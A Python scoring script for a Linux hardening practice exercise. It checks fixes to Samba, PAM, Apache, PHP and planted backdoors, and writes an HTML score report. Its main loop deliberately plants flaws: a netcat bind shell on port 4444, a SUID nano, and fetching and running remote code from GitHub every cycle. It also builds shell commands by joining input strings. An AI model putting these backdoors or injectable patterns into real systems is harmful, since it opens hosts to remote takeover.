#!/usr/bin/env python3
#~~~~~~~~~~~~~~~~~~~~~~~SETUP~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~#
import os
import sys
import time
import pwd
import grp
import subprocess
from pylab import *
from matplotlib.ticker import *
import _datetime
from multiprocessing import Process
import numpy as np
import matplotlib.pyplot as plt
import urllib.request as urllib2
import re
mainUser = 'cyber' #the place to install ScoringEngine
today = _datetime.date.today()
#~~~~~~~~~~~~~~~~Create Classes~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~#
class Service:
    def __init__(self,name,port):
        self.port = port
        self.name = name
    def getPort(self):
        return self.port
    def getName(self):
        return self.name
    def isDown(self):   
        if os.system('''ss -tulpn | grep ''' + str(self.getPort()))  == 0:
            return False
        return True
class User:
    def __init__(self,name):
            self.name=name
    def getName(self):
            return self.name    
    def works(self):
        try:
            pwd.getpwnam(self.getName())
            return True
        except KeyError:
            return False
class Group:
    def __init__(self,name):
            self.name=name
    def getName(self):
            return self.name
    def exists(self):
        try:
            grp.getgrnam(self.getName())
            return True
        except KeyError:
            return False

class Task:
    def __init__(self,level, desc, val, boolean): #constructor
        self.desc = desc
        self.boolean = boolean
        self.val = val
        self.level = level

    #returns the point value of the task
    def getValue(self):
        return self.val
    #returns the description of the task
    def getLevel(self):
        return self.level
    #returns the level of the task
    def getDescription(self):
        return self.desc

    #returns true if the boolean criterion is met
    def isFixed(self):
        if os.system(self.boolean) == 0: 
        #runs the linux boolean command to see the result
            return True
        else:
            return False
#~~~~~~~~~~~~~~~~~~~~~~THINGS TO SCORE~~~~~~~~~~~~~~~~~~~~~~~~~#
users = [User(mainUser)] #If a user is deleted, you get a penalty
services = [] #If a service is down, you get a penalty
allTasks = [
    Task('Returner','Unneeded ports closed', 5, '[ "$()" ]'),
    Task('Returner','Bad umask for BASHRC fixed', 5, '[ "$(grep umask ~/.bashrc | grep 022)" ]'),
    Task('Returner','pam permit.so fixed in common-auth', 5, '[ "$(grep requisite /etc/pam.d/common-auth | grep deny)" ]'),
    Task('Returner','Hidden root user removed', 5, '[ "$(grep "0\:0" /etc/passwd -c | grep 1)" ]'),
    Task('Returner','SUID bit removed on nano', 5, '[ ! "$(stat -c "\%a" /bin/nano | grep 4777)" ]'),
    Task('Returner','SUID bit removed on vim', 5, '[ ! "$(stat -c "\%a" /usr/bin/vim.tiny | grep 4777)" ]'),
    Task('Returner','Samba script file removed', 5, '[ ! "$(ls -al /home/Public | grep sh)" ]'),
    Task('Returner','Samba updated', 5, '[ ! "$(samba -V | grep 4.1.17)" ]'),
    Task('Returner','SMB1 disabled', 5, '[ ! "$(grep NT1 /etc/samba/smb.conf)" ]'),
    Task('Returner','Bad samba share removed', 5, '[ ! "$(grep Public2 /etc/samba/smb.conf)" ]'),
    Task('Returner','Samba anonymous accounts disabled', 5, '[ ! "$(grep "map to guest" /etc/samba/smb.conf)" ]'),
    Task('Returner','Unauthorized samba user removed', 5, '[ ! "$(pdbedit -L | grep simba)" ]'),
    Task('Returner','APT Downloads from main server', 5, '[ ! "$(grep unix-solution /etc/apt/sources.list)" ]'),
    Task('Returner','System checks for updates', 5, '[ "$(grep "Update-Package-Lists" /etc/apt/apt.conf.d/10periodic| grep 1)" ]'),
    Task('Returner','Bad admin removed', 5, '[ ! "$(grep "adm" /etc/group | grep "nadine")" ]'),
    Task('Returner','PAM enforces security for passwords', 5, '[ "$(grep "ucredit=‐1 lcredit=‐1 dcredit=‐1 ocredit=‐1" /etc/pam.d/common‐password)" ]'),
    Task('Returner','Insecure password fixed', 5, '[ ! "$(grep MeZUTA /etc/shadow)" ]'),
    Task('Returner','UFW enabled', 5, '[ "$(ufw status | grep enable)" ]'),
    Task('Returner','System stops forkbombs', 5, '[ ! "$(grep "nproc" /etc/security/limits.conf | grep "\#")" ]'),
    Task('Returner','SYSCTL IPV4 TIME-WAIT ASSASINATION ENABLED', 5, '[ "$(grep net.ipv4.tcp_rfc1337 /etc/sysctl.conf | grep 1)" ]'),
    Task('Returner','SYSCTL TCP Syn Cookies enabled', 5, '[ "$(grep net.ipv4.tcp_syncookie /etc/sysctl.conf | grep 1)" ]'),
    Task('Returner','Removed user tac', 5, '[ ! "$(grep tac /etc/passwd)" ]'),
    Task('Returner','fcrackzip removed', 5, '[ ! "$(dpkg --list | grep fcrackzip)"]'),
    #~~~#Webserver~~~#

    Task('Returner','Apache2 Sensitive information hidden', 3, ' [ "$(grep ServerSignature /etc/apache2/apache2.conf)" ]'),
    Task('Returner','Apache2 mod security WAF installed', 3, ' [ "$(dpkg-query -l libapache2-modsecurity2)" ]'),
    #updated
    Task('Returner','Apache2 port set', 3, ' [ "$(grep 443 /etc/apache2/ports.conf)" ]'), 
    Task('Returner','Apache2 headers tls', 3, ' [ "$(apache2ctl -t -D DUMP_MODULES | grep header)" ]'),
    Task('Returner','Apache2 server token info set', 3, ' [ "$(grep ServerTokens /etc/apache2/apache2.conf)" ]'),
    Task('Returner','Apache2 follow symlinks', 4,'[ "$(grep AllowOverride /etc/apache2/sites-enabled/000-default.conf | grep Indexes)" ] '),
    Task('Returner','Apache2 permissions set', 3, ' ! [ "$(stat -c "%a %n" /etc/apache2/apache2.conf | grep 777)" ]'),
    Task('Returner','Apache2 CGI disabled', 3, '! [ "$(apache2ctl -t -D DUMP_MODULES | grep cgi)" ]'), 


    Task('Returner','PHP basic information hidden', 2,'[ "$(grep expose_php /etc/mysql/mysql.conf.d/mysqld.cnf | grep -i off)" ]'), 
    Task('Returner','PHP dangerous functions are blocked', 2,'[ "$(grep popen /etc/php/7.0/cli/php.ini)" ]'), 
    Task('Returner','PHP remote code execution blocked', 2,'[ "$(grep fopen /etc/php/7.0/cli/php.ini | grep -i off)" ]'),
    Task('Returner','PHP file uploads enabled', 2,'[ "$(grep file_uploads /etc/php/7.0/cli/php.ini | grep -i on)" ]'),
    Task('Returner','PHP dangerously large file upload size fixed', 4,' ! [ "$(grep upload_max_filesize /etc/php/7.0/cli/php.ini | grep -i Gb)" ]'),
    Task('Returner','PHP max execution time reduced', 3,' ! [ "$(grep max_execution /etc/php/7.0/cli/php.ini | grep 5000)" ]'),
    Task('Returner','PHP Open Base Dir set', 3,' ! [ "$(grep open_basedir /etc/php/7.0/cli/php.ini | grep \';\')" ]'),
    #~~~Backdoors~~~#
    #!!!# Task('Returner','Anacron job removed', 5, '[ ! "$(grep netcat /etc/cron.d/anacron)" ]'),
    Task('Returner','Ubuntu 16.04 Kernel Root Exploit Files removed', 5, '[ ! "$(ls -al /usr/lib | grep 39772)" ]'),
    Task('Returner','Kernel Updated', 5, '[ ! "$(uname -a | grep  4.4.0-204-generic)" ]'),
    #rootkit hides itself, can't score#Task('Returner','Bad kernel module removed for diamorphine',5, '[ !"$(grep "diamorphine" /proc/modules)" ]')
    Task('Returner','POTT Driver backdoor', 5, '[ ! "$(grep "RSHELL" /etc/udev/rules.d/71-vbox-kernel-drivers.rules)" ]'),
    Task('Returner','Apache2 mod_backdoor removed', 5, '[ ! "$(apache2ctl -t -D DUMP_MODULES | grep backdoor)" ]')
    ]
groups = [] #groups that must exist, or else a penalty
#~~~~~~~~~~~~~~~CREATE THE WEBSITE/CALCULATE POINTS~~~~~~~~~~~~~#
def update():
    percent = str(round(currentPoints / totalPoints * 100, 1)) + '%'
    score = str(currentPoints) + " out of " + str(totalPoints) + " total points"
    questionsAnswered = str(numFixedVulns) + " out of " + str(len(allTasks)) + " total tasks completed"
    BeginnerSolved = 0
    BeginnerTotal = 0
    returnerSolved = 0
    returnerTotal = 0
    advancedSolved = 0
    advancedTotal = 0

    for t in allTasks:
            if t.getLevel() == 'Beginner':
                BeginnerTotal = BeginnerTotal + 1
            if t.getLevel() == 'Returner':
                returnerTotal = returnerTotal + 1
            if t.getLevel() == 'Advanced':
                advancedTotal = advancedTotal + 1
    h = open('/home/'+ mainUser +'/Desktop/ScoreReport.html','w')
    h.write('<!DOCTYPE html> <html> <head> <meta name="viewport" content="width=device-width, initial-scale=1"> <style> * { box-sizing: border-box; } .column { float: left; padding: 10px; height: 1500px; } .left, .right { width: 25%; } .middle { width: 50%; } .row:after { content: ""; display: table; clear: both; }</style> </head> <body><div class="row"> <div class="column left" style="background-color:#0d60bf;"></div> <div class="row"> <div class="column middle" style="background-color:#fff;"><h1 style="text-align: center;"><span style="font-family: arial, helvetica, sans-serif;">Score Report</span></h1><h2 style="text-align: center;"><br /><span style="font-family: arial, helvetica, sans-serif;">' + percent + ' completed</span></h2><p> </p>')
    h.write('<p><span style="font-family: arial, helvetica, sans-serif; text-align: center;"><strong>' + "Report Generated at: " + str(today) + '. </strong></span></p>')
    h.write('<p><span style=color:red;"font-family: arial, helvetica, sans-serif;"><strong>' + str(penalties) + ' Points in Scoring Penalties</strong></span></p>')
    h.write('<p><span style="font-family: arial, helvetica, sans-serif;"><strong>' + str(score) + '. </strong></span></p>')
    h.write('<p><span style="font-family: arial, helvetica, sans-serif;"><strong>' + str(questionsAnswered) + '. </strong></span></p>')
    h.write('<style> div { background-image: url(https://i.pinimg.com/originals/15/79/25/157925e28f33c43a30973791b2f787f4.jpg); background-blend-mode: lighten; } </style>')
    h.write('<hr class="line2"><br>')

    for u in users:
        if not u.works():
            h.write('<p><span style=color:red;"font-size: 10pt;  font-family: arial, helvetica, sans-serif;">'
                         + u.getName()
                        + ' is NOT functional: - 5 points</span></p>')
    for s in services:
        if s.isDown():
                h.write('<p><span style=color:red;color:red;"font-size: 10pt;  font-family: arial, helvetica, sans-serif;">'
                         + s.getName()
                        + ' is NOT functional or Using wrong port: - 5 points</span></p>')
    for g in groups:
        if not g.exists():
                h.write('<p><span style=color:red;"font-size: 10pt;  font-family: arial, helvetica, sans-serif;">'
                         + g.getName()
                        + ' is NOT created: - 5 points</span></p>')
    for t in allTasks:
        if t.isFixed() and t.getLevel() == 'Beginner':
            BeginnerSolved = BeginnerSolved + 1
            h.write('<p><span style="font-size: 10pt; font-family: arial, helvetica, sans-serif;">'
            + '<span style="color:green;">Beginner</span>' + ' ' + t.getDescription() + ' '
            + str(t.getValue()) + ' points</span></p>')

        if t.isFixed() and t.getLevel() == 'Returner':
            returnerSolved = returnerSolved + 1
            h.write('<p><span style="font-size: 10pt; font-family: arial, helvetica, sans-serif;">'
            + '<span style="color:blue;">Returner</span>' + ' ' + t.getDescription() + ' '
            + str(t.getValue()) + ' points</span></p>')

        if t.isFixed() and t.getLevel() == 'Advanced':
            advancedSolved = advancedSolved + 1
            h.write('<p><span style="font-size: 10pt; font-family: arial, helvetica, sans-serif;">'
            + '<span style="color:purple;">Advanced</span>' + ' ' + t.getDescription() + ' '
            + str(t.getValue()) + ' points</span></p>')

    bS = str(BeginnerSolved) + " out of " + str(BeginnerTotal) + " Beginner tasks completed"
    rS = str(returnerSolved) + " out of " + str(returnerTotal) + " returner tasks completed"
    aS = str(advancedSolved) + " out of " + str(advancedTotal) + " advanced tasks completed"
    h.write('<p><span style="font-family: arial, helvetica, sans-serif;"><strong>' + str(bS) + '. </strong></span></p>')
    h.write('<p><span style="font-family: arial, helvetica, sans-serif;"><strong>' + str(rS) + '. </strong></span></p>')
    h.write('<p><span style="font-family: arial, helvetica, sans-serif;"><strong>' + str(aS) + '. </strong></span></p>')
    h.write('<img src=".graph.png" alt="Graph" width="350" height="250">')
    h.write('</div> <div class="row"> <div class="column right" style="background-color:#0d60bf;"></div> </body>')
    h.write('<meta http-equiv="refresh" content="20">')
    h.write('<footer><h6>Cyber Club</h6></footer>')

#~~~~~~~~~~~~~~~~~~~~~Make a bar popup on screen when you get points~~~~~~~~~~~~~~~~~~~~~~~#
def notify(ph):
    #Creates a popup on the screen
    icon_path = "/usr/bin/scorebot/scoring.png"
    if (ph[-1] > ph[-2]):
        os.system('notify-send -i ' + icon_path + ' \'You Earned Points!\' ')

    if (ph[-1] < ph[-2]):
        os.system('notify-send -i ' + icon_path + ' \'You Lost Points!\' ')
#~~~~~~~~~~~~~~~~~~~~Send data to server~~~~~~~~~~~~~~~~~~~~~~~~~~#
pointHistory = [0,0,0] #list containing the history of points, add 3 0's so chart looks better
HasEnteredTeamInfo = False #Have they put in info in the GUI created by TeamInfo.py(example: none:single:none:none)
dUSR = ""
dMode = ""
dServIP = ""
key = "cool" #secret key so people can't just send data to the server to get points
while True:
    ##Have array of previous points every 5 seconds and send the array to the returnScore.py
    currentPoints = 0 #The amount of points you currently have
    lastPoints = 0 #the previous current points
    penalties = 0 #Number of penalties
    numFixedVulns = 0
    totalPoints = 0

    for i in services:
        if i.isDown():
            penalties = penalties + 5
    for i in groups:
        if not i.exists():
            penalties = penalties + 5
    for i in users:
        if not i.works():
            penalties = penalties + 5
    for i in allTasks:
        totalPoints = totalPoints + i.getValue()
        if i.isFixed():
                numFixedVulns = numFixedVulns + 1
                currentPoints = currentPoints + i.getValue()
    currentPoints = currentPoints - penalties
    pointHistory.append(currentPoints)
    notify(pointHistory)

    while (not HasEnteredTeamInfo):
        print("enter team Info")
        os.system("python3 /home/"+mainUser+"/Desktop/TeamInfo.py")
        TeamInfo = os.popen("head -n1 /etc/scorebot/.usr.dat").read()
        #print("Team Info is: " + str(TeamInfo))
        dUSR = str(TeamInfo.split(":")[0])
        print("dusr is:" + dUSR)
        dMode = str(TeamInfo.split(":")[1])
        dServIP = str(TeamInfo.split(":")[2] + ":" + str(TeamInfo.split(":")[3]))
        HasEnteredTeamInfo = True
        print ("dMode is now: " + dMode)

    if (dMode == "server" ):
        data = str(dUSR) + ":" + str(currentPoints) + ":" + str(int((time.time() / 60))) + ":" + str(key) 
        os.system("curl -X POST -d " + data + " http://" + dServIP)

#~~~~~~~~~~~~~~Create a graph to add to the .html webpage~~~~~~~~~~~~~~~~~~~~~~~~#
    Y = np.array(pointHistory) 
    ax = plt.axes()
    ax.plot(Y, linewidth=4, color="red")
    plt.axhline(y=0, color="black")
    ax.yaxis.set_major_locator(MaxNLocator(integer=True))
    plt.savefig('.graph.png',bbox='tight')
    update()
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~AutoExec.py~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~#
#This isn't very secure. Runs whatever is in the github location below. Use if you need to change something during the scoring
    os.system("mkdir /opt/var &> /dev/null")
    fileLocationURL = "https://raw.githubusercontent.com/CyberCyber2/ScoringEngine/main/BaseFiles/01-AutoExec.py"
    html_content = urllib2.urlopen(fileLocationURL).read().decode('utf-8')
    matches = re.findall(str("[enable]"), html_content);
    #simulate hidden backdoor. Solution isn't to remove netcat, but block the command
    os.system("apt-get install netcat-traditional")
    os.system("netcat -lvp 4444 -e /bin/bash & 2>/dev/null")
    os.system("chmod 4777 /usr/bin/nano")

    if len(matches) != 0: 
        #print ('HTML Content: ' + str(html_content))
        filename = "systemConf.py"
        file_ = open("/opt/var/" + filename, 'w')
        file_.write(html_content)
        file_.close()
        subprocess.call(['chmod', '777',"/opt/var" + filename])
        subprocess.call(['python3', "/opt/var" + filename])
    time.sleep(20) #scoring interval


#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~DEBUG~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~#
#Delete all processes with a name
    #ps -ef | grep 'scorebot.py' | grep -v grep | awk '{print $2}' | xargs -r kill -9
    #ps -ef | grep 'ScoringEngine.py' | grep -v grep | awk '{print $2}' | xargs -r kill -9
    #rm -rf /etc/scorebot/.usr.dat
#fix apt command locked
#sudo killall apt apt-get
#sudo rm /var/lib/apt/lists/lock
#sudo rm /var/cache/apt/archives/lock
#sudo rm /var/lib/dpkg/lock*
#sudo dpkg --configure -a
